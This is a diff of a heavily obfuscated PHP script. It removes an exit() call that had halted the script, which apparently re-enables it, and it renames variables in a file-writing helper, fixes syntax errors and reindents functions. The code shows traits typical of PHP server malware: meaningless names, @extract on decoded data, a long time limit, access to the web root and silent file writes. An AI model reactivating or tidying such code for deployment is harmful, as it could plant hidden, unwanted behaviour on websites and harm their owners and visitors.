@@ -130,7 +130,6 @@ foreach($b6b66b as $i=>$cipher){
 
 @extract($b6b66b);
 
-exit();
 
 preg_match(l1FLe62h("K/@mJB3pOxjmNx8y"),$bbbb66b6,$_SESSION["oO0Oo0OO0"]);
 @set_time_limit(7200);
@@ -148,16 +147,17 @@ $l1bS3es=$l1o7fR=$l1M=$l1EbALe=$l1h=$l1Z4k=$l1Ni6=$l1VQ="";
 $l1T2=$l1gfDiJL=$l1NhADdH=$l1h1=$l135vXS=$l1bhL8Zi=$l1GH0rfZ=array();
 $l1I=$_SERVER["DOCUMENT_ROOT"];
 
-function l1AeQJ($l1wrveK,$l11kcxLR='',$l1U='w'){
-    $l1vze=@fopen($l1wrveK,$l1U);
-    if($l1vze!==false){
-        fwrite($l1vze,$l11kcxLR);
-        fclose($l1vze);
+/* Write file */
+function l1AeQJ($fname,$content='',$mode='w'){
+    $file = @fopen($fname,$mode);
+    if($file !== false){
+        fwrite($file,$content);
+        fclose($file);
     }
 }
 
 function l13C3($l1ihTM1){
-    returnpreg_split($GLOBALS["b6"],$l1ihTM1,-1,PREG_SPLIT_NO_EMPTY);
+    return preg_split($GLOBALS["b6"],$l1ihTM1,-1,PREG_SPLIT_NO_EMPTY);
 }
 
 function l1O2($l14kn,$l1U4n=0,$l1kqFWwO=1,$l1ss2z=null,$l1ms=array()){
@@ -217,7 +217,7 @@ function l1AZ($l1OB09n='',$l1Au7aJz=false){
     if($l1Au7aJz){
         $l1zYgg17.=$GLOBALS["bb6bbb666"];
     }
-    returnpreg_match("/($l1zYgg17)/si",$l1OB09n);
+    return preg_match("/($l1zYgg17)/si",$l1OB09n);
 }
 
 function l1Qw8rL($l15sT8Q=''){
@@ -507,30 +507,34 @@ function l1n($l12,$l1uiO){
 function l15w($l1WoAo5U,$l1OZb,$l1S=array()){
     $l1Lp=array('a'=>-1,'b'=>-1);
     if(is_array($l1S)){
-    foreach($l1S as$l12b){
-    if(is_numeric($l12b)){
-    if($l1Lp["a"]==-1){
-    $l1Lp["a"]=$l12b;
-    }else{
-    $l1Lp["b"]=$l12b;
-    }}}}
+        foreach($l1S as$l12b){
+            if(is_numeric($l12b)){
+                if($l1Lp["a"]==-1){
+                    $l1Lp["a"]=$l12b;
+                }else{
+                    $l1Lp["b"]=$l12b;
+                }
+            }
+        }
+    }
     return$l1Lp;
 }
 
 function l1kw6($l1L='',$l1FGxQ=0){
-if($l1FGxQ){
-$l1L=preg_replace($GLOBALS["b6bb666"],'&',$l1L);
-$l1L=preg_replace($GLOBALS["b6bb6"],"'",$l1L);
-$l1L=preg_replace($GLOBALS["bbb6bbb6"],'"',$l1L);
-$l1L=preg_replace($GLOBALS["b6bbb66b6"],'>',$l1L);
-$l1L=preg_replace($GLOBALS["b66666"],'<',$l1L);
-}else{
-$l1L=preg_replace("/&/s",$GLOBALS["b66b6"],$l1L);
-$l1L=preg_replace("/'/s",$GLOBALS["b6b6b66b"],$l1L);
-$l1L=preg_replace('/"/s',$GLOBALS["b66bb66b"],$l1L);
-$l1L=preg_replace("/>/s",$GLOBALS["bbb6bb6b"],$l1L);
-$l1L=preg_replace("/</s",$GLOBALS["bbb6bbb"],$l1L);
-}return$l1L;
+    if($l1FGxQ){
+        $l1L=preg_replace($GLOBALS["b6bb666"],'&',$l1L);
+        $l1L=preg_replace($GLOBALS["b6bb6"],"'",$l1L);
+        $l1L=preg_replace($GLOBALS["bbb6bbb6"],'"',$l1L);
+        $l1L=preg_replace($GLOBALS["b6bbb66b6"],'>',$l1L);
+        $l1L=preg_replace($GLOBALS["b66666"],'<',$l1L);
+    }else{
+        $l1L=preg_replace("/&/s",$GLOBALS["b66b6"],$l1L);
+        $l1L=preg_replace("/'/s",$GLOBALS["b6b6b66b"],$l1L);
+        $l1L=preg_replace('/"/s',$GLOBALS["b66bb66b"],$l1L);
+        $l1L=preg_replace("/>/s",$GLOBALS["bbb6bb6b"],$l1L);
+        $l1L=preg_replace("/</s",$GLOBALS["bbb6bbb"],$l1L);
+    }
+    return  $l1L;
 }
 
 function l1RnVra($l1P=0,$l1X='3~5',$l108=-1){
